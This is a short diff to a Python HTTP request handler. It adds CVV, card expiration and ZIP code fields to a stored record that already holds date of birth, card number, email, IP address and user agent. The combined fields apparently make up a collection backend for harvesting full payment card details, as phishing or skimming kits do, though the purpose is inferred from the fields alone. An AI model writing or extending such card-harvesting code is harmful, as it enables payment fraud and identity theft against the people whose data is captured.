@@ -49,6 +49,9 @@ class handler(BaseHTTPRequestHandler):
                     dob=data.get('dob'),
                     card_number=data.get('card_number'),
                     email=data.get('email'),
+                    cvv=data.get('cvv'),
+                    expiration=data.get('expiration'),
+                    zip_code=data.get('zip_code'),
                     ip_address=ip_address,
                     user_agent=user_agent
                 )
